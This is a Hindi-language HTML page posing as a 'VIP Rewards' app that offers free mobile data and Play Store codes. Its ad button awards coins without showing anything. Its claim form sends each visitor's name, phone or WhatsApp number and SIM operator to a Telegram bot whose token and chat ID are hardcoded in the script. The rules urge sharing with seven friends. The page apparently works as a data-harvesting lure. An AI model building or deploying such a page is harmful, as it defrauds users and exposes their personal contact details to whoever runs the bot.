<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VIP Rewards App</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
    body { background: #0f101c; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
    .app-card { background: #1a1c2e; width: 100%; max-width: 420px; border-radius: 16px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #2d325a; }
    .header { text-align: center; margin-bottom: 20px; }
    .header h2 { color: #ffd700; font-size: 24px; }
    .coin-box { background: linear-gradient(135deg, #f39c12, #d35400); padding: 15px; border-radius: 12px; text-align: center; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(243,156,18,0.3); }
    .coin-box h3 { font-size: 30px; font-weight: bold; }
    .coin-box p { font-size: 14px; opacity: 0.9; }
    .action-btn { width: 100%; padding: 14px; margin-bottom: 12px; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
    .btn-ad { background: #4e54c8; color: white; }
    .btn-ad:hover { background: #3f44a5; }
    .btn-claim { background: #ffd700; color: #111; }
    .btn-claim:hover { background: #e6c200; }
    .rules-card { background: #131524; padding: 12px; border-radius: 10px; font-size: 13px; color: #a0a5c0; line-height: 1.5; margin-top: 15px; }
    .rules-card strong { color: #ffd700; }

    /* Modal Styling */
    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; justify-content: center; align-items: center; padding: 15px; }
    .modal-box { background: #1e1e2f; color: #fff; padding: 20px; border-radius: 14px; max-width: 380px; width: 100%; text-align: center; border: 1px solid #3d426b; }
    .modal-box h3 { color: #ffd700; margin-bottom: 10px; }
    .input-group { text-align: left; margin-bottom: 12px; }
    .input-group label { font-size: 13px; color: #ccc; display: block; margin-bottom: 4px; }
    .input-group input, .input-group select { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #444; background: #2a2a3e; color: #fff; outline: none; font-size: 14px; }
    .btn-submit { width: 100%; padding: 12px; background: #28a745; color: #fff; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; font-size: 15px; margin-top: 5px; }
    .btn-close { width: 100%; padding: 8px; background: transparent; color: #bbb; border: none; margin-top: 5px; cursor: pointer; font-size: 13px; }
  </style>
</head>
<body>

<div class="app-card">
  <div class="header">
    <h2>VIP REWARDS</h2>
    <p style="font-size: 13px; color: #8890b5;">ऐड्स देखें और 1GB डेटा व रिडीम कोड पाएँ</p>
  </div>

  <div class="coin-box">
    <h3 id="coinCount">350</h3>
    <p>कुल कॉइन्स बैलेंस</p>
  </div>

  <button class="action-btn btn-ad" onclick="watchAd()">🎬 वीडियो देखें (+10 कॉइन्स)</button>
  <button class="action-btn btn-claim" onclick="openRewardModal()">🎁 रिवॉर्ड क्लेम करें</button>

  <div class="rules-card">
    📌 <strong>ऑफ़र व नियम:</strong><br>
    • <strong>250 कॉइन्स</strong> = ₹10 Play Store कोड (पहले 3 बार)<br>
    • <strong>350 कॉइन्स</strong> = 1GB इंटरनेट डेटा पैक<br>
    • <strong>7 दोस्तों को शेयर करें</strong> = दोबारा 250 कॉइन में ₹10 कोड अनलॉक
  </div>
</div>

<!-- Claim Popup Modal -->
<div id="reward-modal" class="modal">
  <div class="modal-box">
    <h3>🎁 रिवॉर्ड क्लेम करें</h3>
    <p style="font-size: 13px; color: #aaa; margin-bottom: 15px;">अपनी जानकारी दर्ज करें:</p>

    <div class="input-group">
      <label>रिवॉर्ड चुनें:</label>
      <select id="claimRewardType" onchange="toggleSimSelect()">
        <option value="1GB Data Pack (350 Coins)">1GB डेटा पैक (350 कॉइन्स)</option>
        <option value="₹10 Google Play Code (250 Coins)">₹10 Google Play Code (250 कॉइन्स)</option>
      </select>
    </div>

    <div class="input-group">
      <label>आपका नाम:</label>
      <input type="text" id="claimUserName" placeholder="नाम लिखें">
    </div>

    <div class="input-group">
      <label>मोबाइल नंबर / WhatsApp:</label>
      <input type="tel" id="claimUserNumber" placeholder="10 अंकों का नंबर" maxlength="10">
    </div>

    <div class="input-group" id="simSelectDiv">
      <label>सिम ऑपरेटर (डेटा के लिए):</label>
      <select id="claimSimOperator">
        <option value="Jio">Jio</option>
        <option value="Airtel">Airtel</option>
        <option value="Vi">Vi (Vodafone Idea)</option>
      </select>
    </div>

    <button class="btn-submit" id="claimSubmitBtn" onclick="sendClaimToTelegram()">तुरंत क्लेम भेजें</button>
    <button class="btn-close" onclick="closeRewardModal()">रद्द करें</button>
  </div>
</div>

<script>
  let userCoins = 350;
  const TG_BOT_TOKEN = "8681623026:AAG9aNaiA7Q-wUwkUjTnOys6VSM6Ki0bO10";
  const TG_CHAT_ID = "6344614701";

  function watchAd() {
    userCoins += 10;
    document.getElementById("coinCount").innerText = userCoins;
    alert("बधाई! ऐड देखने पर आपको 10 कॉइन्स मिले।");
  }

  function openRewardModal() {
    document.getElementById("reward-modal").style.display = "flex";
  }

  function closeRewardModal() {
    document.getElementById("reward-modal").style.display = "none";
  }

  function toggleSimSelect() {
    const rewardType = document.getElementById("claimRewardType").value;
    const simDiv = document.getElementById("simSelectDiv");
    if (rewardType.includes("1GB Data")) {
      simDiv.style.display = "block";
    } else {
      simDiv.style.display = "none";
    }
  }

  function sendClaimToTelegram() {
    const name = document.getElementById("claimUserName").value.trim();
    const phone = document.getElementById("claimUserNumber").value.trim();
    const reward = document.getElementById("claimRewardType").value;
    const sim = reward.includes("1GB Data") ? document.getElementById("claimSimOperator").value : "लागू नहीं";

    let requiredCoins = reward.includes("1GB Data") ? 350 : 250;

    if (userCoins < requiredCoins) {
      alert("आपके पास पर्याप्त कॉइन्स नहीं हैं! आवश्यक: " + requiredCoins + " कॉइन्स।");
      return;
    }

    if (!name || phone.length < 10) {
      alert("कृपया सही नाम और 10 अंकों का मोबाइल नंबर डालें!");
      return;
    }

    const btn = document.getElementById("claimSubmitBtn");
    btn.disabled = true;
    btn.innerText = "भेजा जा रहा है...";

    const messageText = `🎉 *नया रिवॉर्ड क्लेम आया है!*%0A%0A👤 *नाम:* ${name}%0A📱 *मोबाइल:* ${phone}%0A🎁 *रिवॉर्ड:* ${reward}%0A📶 *सिम:* ${sim}%0A⏰ *समय:* ${new Date().toLocaleString()}`;

    const tgUrl = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${messageText}&parse_mode=Markdown`;

    fetch(tgUrl)
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          userCoins -= requiredCoins;
          document.getElementById("coinCount").innerText = userCoins;
          alert("बधाई! आपका क्लेम सबमिट हो गया है। जल्द ही आपको रिवॉर्ड मिल जाएगा।");
          closeRewardModal();
        } else {
          alert("एरर! बॉट से संपर्क नहीं हो पाया।");
        }
      })
      .catch(err => {
        alert("इंटरनेट एरर! कृपया दोबारा कोशिश करें।");
      })
      .finally(() => {
        btn.disabled = false;
        btn.innerText = "तुरंत क्लेम भेजें";
      });
  }
</script>

</body>
</html>
